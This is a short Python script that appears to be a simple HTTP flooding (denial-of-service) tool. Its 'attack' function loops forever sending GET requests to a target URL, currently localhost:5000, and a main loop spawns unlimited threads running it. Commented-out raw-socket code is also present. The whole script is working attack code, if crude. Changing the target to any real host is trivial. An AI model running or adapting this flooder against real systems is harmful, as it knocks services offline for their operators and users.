from multiprocessing.resource_sharer import stop
import requests
import threading

target = 'http://localhost:5000'
port = 3000

attack_num = 0

def attack():
    while True:
        # AF_inet -> socket familt: Internet Protocol with IPv4
        # SOCK_STREAM -> socket type: stream-based protocol for TCP
        # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # s.connect((target,port))
        # s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target,port))
        requests.get(target)

        global attack_num
        attack_num += 1
        print(attack_num)

while (True):
    thread = threading.Thread(target=attack)
    thread.start()